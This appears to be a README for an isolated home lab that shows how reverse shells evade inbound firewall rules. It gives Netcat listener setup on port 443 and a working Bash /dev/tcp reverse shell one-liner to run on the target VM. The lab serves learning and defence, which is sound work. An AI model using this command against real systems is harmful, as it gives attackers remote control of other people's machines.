Reverse Shell Lab
This project demonstrates how reverse shells operate at a fundamental level and why they are commonly used to gain remote access. By observing outbound connections in an isolated environment, the lab shows how reverse shells bypass inbound firewall restrictions and what unencrypted traffic looks like in transit. This provides a practical foundation for understanding attacker behavior, firewall limitations, and early indicators of compromise.

Most home and enterprise networks block incoming connections but allow outbound traffic. A reverse shell takes advantage of this by having the target initiate the connection back to the attacker, allowing remote access even when inbound connections are filtered.

Objective
Understand how reverse shells establish remote access.

Observe how outbound connections behave in a controlled environment.

Analyze why firewalls commonly block inbound traffic but allow outbound traffic.

Build intuition for how attackers leverage this behavior in real-world intrusions.

Lab Environment
Attacker: Raspberry Pi running Ubuntu Server

Target: Windows host running an Ubuntu VM

Networking: VirtualBox Internal Network (isolated)

Tools: Netcat (OpenBSD), Bash reverse shell

Tools
Netcat (OpenBSD)
A lightweight networking utility used for reading and writing data across TCP/UDP connections. In this lab, Netcat acts as the listener waiting for the target to connect back.

Bash Reverse Shell
A simple Bash one-liner that redirects input/output streams over a TCP connection, enabling remote command execution.

Netcat Installation
Update the package list:

bash
sudo apt update
Install Netcat:

bash
sudo apt install netcat-openbsd
Verify installation:

bash
nc -h
Setting Up the Listener (Attacker Machine)
Switch to the root user:

bash
sudo su -
Check network interfaces:

bash
ifconfig
Start the Netcat listener on port 443:

bash
nc -l -v -n -p 443
Parameter Explanation
-l: Listen mode

-v: Verbose output

-n: Disable DNS resolution

-p: Specify port

Port 443 is used because outbound HTTPS traffic is commonly allowed through firewalls.

Notes
Port 443 simulates realistic outbound traffic.

Internal Network mode provides a clean, isolated lab environment.

NAT adapters can be added for internet access, but this project remains offline-only.

Executing the Reverse Shell (Target VM)
Run the following command inside the Ubuntu VM on the Windows host:

bash
bash -i >& /dev/tcp/192.168.1.50/443 0>&1
Replace 192.168.1.50 with the attacker's actual IP address.

This command redirects standard input, output, and error streams over a TCP connection back to the listener.

Listener Output (Attacker)
After executing the reverse shell command on the target, the listener should display output confirming:

The listener is active on port 443

The target initiated the connection

The TCP handshake completed

Remote command execution is now occurring on the target system